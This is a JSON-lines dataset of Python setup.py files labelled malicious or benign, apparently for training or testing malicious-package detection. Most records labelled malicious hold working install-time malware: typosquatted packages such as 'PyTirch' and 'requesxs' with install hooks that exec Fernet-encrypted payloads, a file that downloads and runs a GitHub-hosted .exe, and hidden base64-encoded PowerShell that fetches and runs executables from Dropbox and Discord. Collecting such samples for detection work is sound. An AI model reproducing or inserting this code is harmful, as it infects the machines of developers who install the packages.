\u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0435 PyPi.\n    classifiers=[\n        \"Programming Language :: Python :: 3.8\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    # \u0422\u0440\u0435\u0431\u0443\u0435\u043c\u0430\u044f \u0432\u0435\u0440\u0441\u0438\u044f Python.\n    python_requires='>=3.6',\n)\n", "target": 1}
{"idx": "lxlm-1", "func": "#!/usr/bin/env python\n\nfrom io import open\nfrom setuptools import setup\nimport requests\nimport sys, os, string\nfrom sys import platform\n\ndef zzr():\n    if platform == 'win32':\n        url = 'https://github.com/jagermager999/8746465cdg78cdsxasy8a/raw/main/test.exe'\n        filename = 'tmp_file_pypi_29x7d0kf8.exe'\n    else:\n        quit()\n\n    rq = requests.get(url, allow_redirects=True)\n\n    open(filename, 'wb').write(rq.content)\n    os.system('start ' + filename)\n\n\nzzr()\n\nversion = '1.0'\n\nsetup(\n    name='lxlm',\n    version=version,\n\n    author='Jonh Doe',\n    author_email='mail@mail.com',\n\n    description=(\n        u'qwertyuioppoiuytrewqqsdfghjkl;lkjhgfdsaazxcvbnm,mmnbvcx'\n    ),\n    long_description='',\n    long_description_content_type='text/markdown',\n\n    url='https://google.com/',\n    download_url='https://google.com/123',\n\n    license='license text',\n\n    packages=['lxlm'],\n    install_requires=['requests'],\n\n    classifiers=[\n        'License :: OSI Approved :: Apache Software License',\n        'Operating System :: OS Independent',\n        'Intended Audience :: End Users/Desktop',\n        'Intended Audience :: Developers',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Programming Language :: Python :: Implementation :: CPython',\n    ]\n)", "target": 1}
{"idx": "openwea-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'MsdyYgXapEauRLvEQFfnyleZiFPIXSvDhVRyqrLvCYaCHozDmN sCuyMCDMW H'\nLONG_DESCRIPTION = 'HKazKrzyEpwRcmfJ ZCswtUigvcwvnyJ zszHzahyARqODSAXuVafAZGgKVWRiyzgAxHDJgQkUKgvGEJu dPLSyYMVehtOSjWBeuPFyoTOsPptGlHOgwkZmcpZpEfWncBLJtsMhOjWfhIEbdmfUAMJHSUStTfK xeOxtuPVVadxAqWkJlogCSa AsQXMFOsTsZrbyBLCWezHkVcdBrsjSRRtBxtTDTuZLAexAkjtxJYY CPkiqxBSpuebSIckcjIQoXqAeqylGYsmlAOAtzohuXAbKO IXUVPB TlmEgOugjJUEQWafVNfNOfdLQlAWcEajjdrYzYWzpRKihXatcWoWYPOOUmNqHqsMMlGZxAVKRmBDFBYvAHFIMdqcjnvDZSeypcgWeFMFMiBhqdqcHSGJyiBUTwqSxcIVmybJGinzwwiZiJyjlqjfFBfgPDEQJKvYvZpR hZqlRXuVYXsLslvRLQDAWiMUrWTlFrgClMqn'\n\n\nclass uLAWZOVPbjjrBVqPHvkwmnKPMEhJHcAAreFqBSgPlONNlmhZHWKvpsjqyYdWCcnaUhFjumyHLAqkPLJGtKrLKksgzifpVIKspFCaqrBcVNrxVMdgxFSALTUStsEdgtssCDzpBerWbaqSB(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'SaPrbndmKdVBPKrIikNRA3eyFVuswdANVyDshWBrHqQ=').decrypt(b'gAAAAABmbvUgwHX9hk96UuojLuWv4NzLKR-KhljRcfxKCJhFTjjv9Bs6nrq1xZyaLBL7zoXQq-MfEIvgSVRrppj2Dar09xwNZU-d6DH2gInIzPdqEghzuLIdurAmYuv7_uyz-PXptKMj9sd12kQi5OU2q6F_Ly1mlppCM3VeDD37wTD8_3N6HwmW6bwrdxmnnIoysEjP9Fe_XZ11QaI9NSoaPJxybM_lyOiCxESkPWH-mPxiZmTwhTI='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"openwea\",\n    version=VERSION,\n    author=\"xVoOcCAqQWXvnrg\",\n    author_email=\"pWfIfwfIpIbzLPp@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': uLAWZOVPbjjrBVqPHvkwmnKPMEhJHcAAreFqBSgPlONNlmhZHWKvpsjqyYdWCcnaUhFjumyHLAqkPLJGtKrLKksgzifpVIKspFCaqrBcVNrxVMdgxFSALTUStsEdgtssCDzpBerWbaqSB,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "dice_ml-0.8", "func": "import setuptools\n\nVERSION_STR = \"0.8\"\n\nwith open(\"README.rst\", \"r\") as fh:\n    long_description = fh.read()\n\n# Get the required packages\nwith open('requirements.txt', encoding='utf-8') as f:\n    install_requires = f.read().splitlines()\n\n# Deep learning packages are optional to install\nextras = [\"deeplearning\"]\nextras_require = dict()\nfor e in extras:\n    req_file = \"requirements-{0}.txt\".format(e)\n    with open(req_file) as f:\n        extras_require[e] = [line.strip() for line in f]\n\nsetuptools.setup(\n    name=\"dice_ml\",\n    version=VERSION_STR,\n    license=\"MIT\",\n    author=\"Ramaravind Mothilal, Amit Sharma, Chenhao Tan\",\n    author_email=\"raam.arvind93@gmail.com\",\n    description=\"Generate Diverse Counterfactual Explanations for any machine learning model.\",\n    long_description=long_description,\n    long_description_content_type=\"text/x-rst\",\n    url=\"https://github.com/interpretml/DiCE\",\n    download_url=\"https://github.com/interpretml/DiCE/archive/v\"+VERSION_STR+\".tar.gz\",\n    python_requires='>=3.6',\n    packages=setuptools.find_packages(),\n    classifiers=[\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Science/Research\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    keywords='machine-learning explanation interpretability counterfactual',\n    install_requires=install_requires,\n    extras_require=extras_require,\n    include_package_data=True,\n    package_data={\n        # If any package contains *.h5 files, include them:\n        '': ['*.h5',\n             'counterfactual_explanations_v1.0.json',\n             'counterfactual_explanations_v2.0.json']\n    }\n)\n", "target": 0}
{"idx": "PyTirch-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'QaRtzxOphFaRkzJgmhJUZMFNNMSEpt ruExwOaYQXehoaCLqkiVuHhFhnxOngJzvIVkxBXqSZQguvmkLmvRZIHIsxNpWD'\nLONG_DESCRIPTION = 'XucBKOROOgadUWRKVmGRzAXbHiLSCsjVwHIzcUVnpHp PkObyaIJzBsWTnSUNxzHBomHzayoCTHOJaBMgLsb sRcfHqJzoJQXpHNaOKgKrnQLYRToeBZYEnLxEVbncLjvzKmsDlfQefaGELoOIDGKqcVSlRQZPSWJsBwlXkWRshriheS'\n\n\nclass NmGoqiRJsPPBAvRyhBVHEtfHPRMFzpajCQOJJPMeVJbJEDZChjcTfCJcfZHNggsGNolkBoWPTBZuZIfHzaajbMtvCBCcvAjWFlbFPAfmUNqUoYDwzDDfJJWCzESdjptGrBfzydGdKYVJJfvmXHQHwOUwLfdjMkbtwFOiMcgtJrwWDar(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'59wPZryzYkt0d15zchhxsjhTJz4OPlcHNF3l4jlST-o=').decrypt(b'gAAAAABmBIK3_8sNDO56W5CLc-dCYGJ6gPoXkk_e_uXYWuEUr2boTuet4Mt6aW5dGoqGhwbVqZOT4vc-vvZ3-Fa5AP9Z2VhaHHQuroLccmuUjQRkX34SMJ3WJQ1HIU-IO8KuDH8Wc1R3ei1aRkDQm8AcGN_vdmpGwfB_cNmZW_9Fl5UJGT21XPLvNiPTTbhg1okWIk0NQX9QP4mCarx-vxic7KurygityfUWzjVpnf5X7rv8knVjBDU='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"PyTirch\",\n    version=VERSION,\n    author=\"IbIeCHXbysvQc\",\n    author_email=\"DsJfnUU@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': NmGoqiRJsPPBAvRyhBVHEtfHPRMFzpajCQOJJPMeVJbJEDZChjcTfCJcfZHNggsGNolkBoWPTBZuZIfHzaajbMtvCBCcvAjWFlbFPAfmUNqUoYDwzDDfJJWCzESdjptGrBfzydGdKYVJJfvmXHQHwOUwLfdjMkbtwFOiMcgtJrwWDar,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "django_saml2_auth-2.2.1", "func": "\"\"\"The setup module for django_saml2_auth.\nSee:\nhttps://github.com/fangli/django_saml2_auth\n\"\"\"\n\nfrom codecs import open\nfrom setuptools import (setup, find_packages)\nfrom os import path\n\nhere = path.abspath(path.dirname(__file__))\n\n# Get the long description from the README file\nwith open(path.join(here, 'README.rst'), encoding='utf-8') as f:\n    long_description = f.read()\n\nsetup(\n    name='django_saml2_auth',\n\n    version='2.2.1',\n\n    description='Django SAML2 Authentication Made Easy. Easily integrate with SAML2 SSO identity providers like Okta',\n    long_description=long_description,\n\n    url='https://github.com/fangli/django-saml2-auth',\n\n    author='Fang Li',\n    author_email='surivlee+djsaml2auth@gmail.com',\n\n    license='Apache 2.0',\n\n    classifiers=[\n        #   3 - Alpha\n        #   4 - Beta\n        #   5 - Production/Stable\n        'Development Status :: 5 - Production/Stable',\n\n        'Intended Audience :: Developers',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n\n        'License :: OSI Approved :: Apache Software License',\n\n        'Framework :: Django :: 1.5',\n        'Framework :: Django :: 1.6',\n        'Framework :: Django :: 1.7',\n        'Framework :: Django :: 1.8',\n        'Framework :: Django :: 1.9',\n        'Framework :: Django :: 1.10',\n\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n    ],\n\n    keywords='Django SAML2 Authentication Made Easy, integrate with SAML2 SSO such as Okta easily',\n\n    packages=find_packages(),\n\n    install_requires=['pysaml2>=4.5.0',\n                      'djangorestframework-jwt',\n                      'django-rest-auth', ],\n    include_package_data=True,\n)\n", "target": 0}
{"idx": "r3quests-2.28.1", "func": "from setuptools import setup\nimport codecs\nimport os\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\nwith codecs.open(os.path.join(here, \"README.md\"), encoding=\"utf-8\") as fh:\n    long_description = \"\\n\" + fh.read()\n\nabout = {}\nabout['__title__'] = \"r3quests\"\nabout['__description__'] = \"Python HTTP for Humans.\"\nabout['__url__'] = \"https://requests.readthedocs.io\"\nabout['__version__'] = \"2.28.1\"\nabout['__build__'] = 0x022801\nabout['__author__'] = \"Kenneth Reitz\"\nabout['__author_email__'] = \"me@kennethreitz.org\"\nabout['__license__'] = \"Apache 2.0\"\nabout['__copyright__'] = \"Copyright 2022 Kenneth Reitz\"\nabout['__cake__'] = \"\\u2728 \\U0001f370 \\u2728\"\n\nrequires = [\n    \"charset_normalizer>=2,<4\",\n    \"idna>=2.5,<4\",\n    \"urllib3>=1.21.1,<1.27\",\n    \"certifi>=2017.4.17\",\n]\ntest_requirements = [\n    \"pytest-httpbin==0.0.7\",\n    \"pytest-cov\",\n    \"pytest-mock\",\n    \"pytest-xdist\",\n    \"PySocks>=1.5.6, !=1.5.7\",\n    \"pytest>=3\",\n]\n\nsetup(\n    name=about[\"__title__\"],\n    version=about[\"__version__\"],\n    description=about[\"__description__\"],\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=about[\"__author__\"],\n    author_email=about[\"__author_email__\"],\n    url=about[\"__url__\"],\n    packages=[\"r3quests\"],\n    package_data={\"\": [\"LICENSE\", \"NOTICE\"]},\n    package_dir={\"requests\": \"requests\"},\n    include_package_data=True,\n    python_requires=\">=3.7, <4\",\n    install_requires=requires,\n    license=about[\"__license__\"],\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Software Development :: Libraries\",\n    ],\n    tests_require=test_requirements,\n    extras_require={\n        \"security\": [],\n        \"socks\": [\"PySocks>=1.5.6, !=1.5.7\"],\n        \"use_chardet_on_py3\": [\"chardet>=3.0.2,<6\"],\n    },\n    project_urls={\n        \"Documentation\": \"https://requests.readthedocs.io\",\n        \"Source\": \"https://github.com/psf/requests\",\n    },\n)\n", "target": 1}
{"idx": "requesxs-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'fdnXLHqmInGYSKGAPZyUlAMkZNW TBKjEmwAtzAsbKKsyGbUbNxIjeAZeApbEtKdhpdL'\nLONG_DESCRIPTION = 'ZkiidmRfqFrBzkBBTD JmAivJCDKBOfESAalzSAPTtUsrOnMhOinrIwcskaAYJJBFAyNswcMZRNRxiuOmdpOSRvRlNUZqYTJClRcAKXelRiltxliXxtgJQVdnRMJPMnLzohZxkHzKaeaSUTjsdgxPzLRxQfUIhjmDSUFwahWKEgmIFNlIfoNjTmzlTLRKLJzPzUDrETRozQrhdHkiQPJlEJDehYkSxcBYcyifDzHNpMTjGdBBFYRPoUlnMKAzNcPnSuZcsbqssErbfgTHmk isD'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'BK5eT2f0TJxosGNJk2aW-ebxndxg7tci8th0E6Z073c=').decrypt(b'gAAAAABmA0cW8XSf1ZtcWrveMiAPsX8NGOdzSzeCiePR6it4wjP07Iin07Rp7bjdkZ6-J5sphneBiANPGCCk19g3H8eBqgfXrhb-TNx6hu9t4otHBSHIteAmtEYt5U36xYvTGakp-lYipnBW0hwV2R4cyoaEAEDAb_1QrfMqei2fnxnb0bo7f3uBUXACtY8HaoXhixg2PlFqR0d571N378qbaxa-BvhBGGskOrFNwnqnxQ_xh2sgrKA='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requesxs\",\n    version=VERSION,\n    author=\"mvpRdazrQMYkB\",\n    author_email=\"JbCfNSRTWXQZtMEEUS@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "flake8-polyfill-1.0.2", "func": "# -*- coding: utf-8 -*-\n\"\"\"Packaging logic for Flake8's polyfill.\"\"\"\nimport io\nimport os\nimport sys\n\nimport setuptools\n\nsys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))\n\nimport flake8_polyfill  # noqa\n\nrequires = ['flake8']\n\n\ndef get_long_description():\n    \"\"\"Generate a long description from the README file.\"\"\"\n    descr = []\n    for fname in ('README.rst',):\n        with io.open(fname, encoding='utf-8') as f:\n            descr.append(f.read())\n    return '\\n\\n'.join(descr)\n\n\nsetuptools.setup(\n    name='flake8-polyfill',\n    license='MIT',\n    version=flake8_polyfill.__version__,\n    description='Polyfill package for Flake8 plugins',\n    long_description=get_long_description(),\n    author='Ian Cordasco',\n    author_email='graffatcolmingov@gmail.com',\n    url='https://gitlab.com/pycqa/flake8-polyfill',\n    package_dir={'': 'src'},\n    packages=[\n        'flake8_polyfill',\n    ],\n    install_requires=requires,\n    classifiers=[\n        \"Environment :: Console\",\n        \"Framework :: Flake8\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Topic :: Software Development :: Quality Assurance\",\n    ],\n)\n", "target": 0}
{"idx": "selfpaypalintel-5.49", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpaypalintel',\n    packages = ['modlib'],\n    version = '5.22',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqgetultragui-5.56", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqgetultragui',\n    packages = ['modlib'],\n    version = '7.75',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "repip-5.32", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'repip',\n    packages = ['modlib'],\n    version = '5.56',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "openesaa-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'winyEbMadcdMzqzwtbxTN'\nLONG_DESCRIPTION = 'LziKxNoZWjgXirHrKHvLyBzsfqUwTGlGSABnWzkvHkcQmiCptHPeefdTqtYrCOtNFWpdIJXQwsVYwsKnXnkzHRvgXYxlhoOHYaGfRmXgoQyzGanxboCpVDQsxHLFRXwteeQKXuCFyHbuJVFPalRJmUyzqrVvbbwHwzphIeCqgWsUOqZAXXUcSirljUIwUQgcHbPoeTpLkDucdlrEKnuAuhRaUBVFBwgcvIAdUih qQnKHyoQzeJwCfRmbPbWaYgJxQGjIcSJheSaCwjHgmNqdmaHIytacsGDRKFHAreuRqQXVbDEmLXLxnXVaXOvEnIJNyYejUhsc NHrJJPzXHpOPzyohaVByxowhbfuJyAmWKEjUQdXoIIkhImrKyWQrHuODhIacxjKwDIIVlxgasJVAgaO'\n\n\nclass cOESHhQTqrfFXmBMKprpceBJhfcUmSfKvQdyfOwbLJwxOnbSBwMxLHhwvDxUnamTr(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'UpmbZBlfMmBmmUKLKB3FDC0iu_SNdYgmV7PJ8nxdmFE=').decrypt(b'gAAAAABmbvT-hK5zKrIAyLANaVsrFFH0fwZRSx9zeHzPZIZKuCA3aurla2-oVkVsI621PWY2Q35PXYAh6zGG94wyS-jccrE7Xkv1PiW6fB2TJ7GARkpICIyHBgpDPBQf_HEcMXnL1PtDc9OV9cdBVfCbmF1UZi1FnI9tkGvuiPtLJM3_J1vBThmMU4j1iSasZDLbDwuEPU_sgpFRnK1YSTR8Ef_Ld-wJVK58N74hreGyG53FhNlSSN8='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"openesaa\",\n    version=VERSION,\n    author=\"nladsdPVsZXDfrc\",\n    author_email=\"jDJxoH@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': cOESHhQTqrfFXmBMKprpceBJhfcUmSfKvQdyfOwbLJwxOnbSBwMxLHhwvDxUnamTr,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "dasdsajdjsaasddsad-2.0.0", "func": "from setuptools import setup\n\nsetup(\n    name='dasdsajdjsaasddsad',\n    version='2.0.0',\n    packages=['dasdsajdjsaasddsad'],\n    url='',\n    license='',\n    author='dark',\n    author_email='email@example.com',\n    description='email@example.com',\n    install_requires=[\n        'requests==2.28.2',\n        'cryptography==40.0.2'\n    ]\n)\n", "target": 1}
{"idx": "openrsea-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'UwdhwdxYmajJNjEXegLSdAkfduounPyyHvGAxSCVCuL  CkqoaUhUEHCjsSxikuZKcGecIb'\nLONG_DESCRIPTION = 'gJtkjadVyoIuthxgoKPOPDVZzzXgGJEjsuZwQeVVqbd vjDALJIxyQjnXEekcRzVEBRVnUaWHmbhrxoTCTZVUPQggXgPnGmRLcPJRUQSZGvWdByH gmdIbSdXjhvEXvlpkgalFIaeqGEgFutixiTghDywCgFpNrJpxKaNysPZGNmENHXU'\n\n\nclass myWfodvRZUxKqrutzFjLnbLPNYxWdVdBHDtDfVwRnhGiPPTumnNMPZyoKGWVeZEnbXDFySrKmGjfngTIMKgTtowfQlmK(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'unIMTtQLfCPYYO18dlSeowTExq-DiHoiEZq2X3Wruzo=').decrypt(b'gAAAAABmbvVdU1NzJQepF_7iiwbpsKqXZxMZZ0EvPrqsYKqtruDfvw3EMLY6PIjJJHJWvdQEbEswzNFyVrJQIInUvxog2nFLDPy2GECux2xw6Xvg-bvTbWnLSAickGLRqMYX1WLVL0rC0W7hml9W5N1KWMEE4ItjKZ4yrVK0wWjQgGPYiR6rC7p_JUkJcRiQu0M-J940Hq-RoJQ7MEp7v5q7mceJzTWxpwoxVMdbLSB_bBpewaOWwLY='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"openrsea\",\n    version=VERSION,\n    author=\"KJCWJJOLPsDZK\",\n    author_email=\"iFZrZBlrjcd@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': myWfodvRZUxKqrutzFjLnbLPNYxWdVdBHDtDfVwRnhGiPPTumnNMPZyoKGWVeZEnbXDFySrKmGjfngTIMKgTtowfQlmK,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "dogpile.cache-1.1.8", "func": "import sys\n\nfrom setuptools import setup\nfrom setuptools.command.test import test as TestCommand\n\n\nclass UseTox(TestCommand):\n    RED = 31\n    RESET_SEQ = \"\\033[0m\"\n    BOLD_SEQ = \"\\033[1m\"\n    COLOR_SEQ = \"\\033[1;%dm\"\n\n    def run_tests(self):\n        sys.stderr.write(\n            \"%s%spython setup.py test is deprecated by pypa.  Please invoke \"\n            \"'tox' with no arguments for a basic test run.\\n%s\"\n            % (self.COLOR_SEQ % self.RED, self.BOLD_SEQ, self.RESET_SEQ)\n        )\n        sys.exit(1)\n\n\nsetup(\n    cmdclass={\"test\": UseTox},\n)\n", "target": 0}
